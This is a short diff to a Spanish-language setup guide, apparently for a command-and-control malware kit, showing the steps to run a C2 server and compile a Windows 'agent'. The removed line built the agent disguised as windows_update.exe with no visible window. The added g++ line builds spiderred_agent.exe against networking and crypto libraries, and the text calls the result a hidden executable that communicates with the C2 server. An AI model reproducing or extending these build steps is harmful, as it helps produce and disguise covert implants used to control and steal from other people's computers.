@@ -22,10 +22,7 @@ python3 c2_server.py
 ## 2. Compilar el Agente Windows
 En Windows con Visual Studio Developer Command Prompt:
 
-cl /std:c++17 /O2 /MT /DNDEBUG /EHsc ^
-    agent_working.cpp ^
-    /link wininet.lib crypt32.lib advapi32.lib ^
-    /OUT:windows_update.exe /SUBSYSTEM:WINDOWS
+g++ -o spiderred_agent.exe agent_working.cpp -lwininet -lcrypt32 -lshell32 -lpsapi -ladvapi32 -std=c++11 -static -O2
 Esto genera un ejecutable oculto de consola que se comunica con el servidor C2.
 
 ## 3. Configurar Red
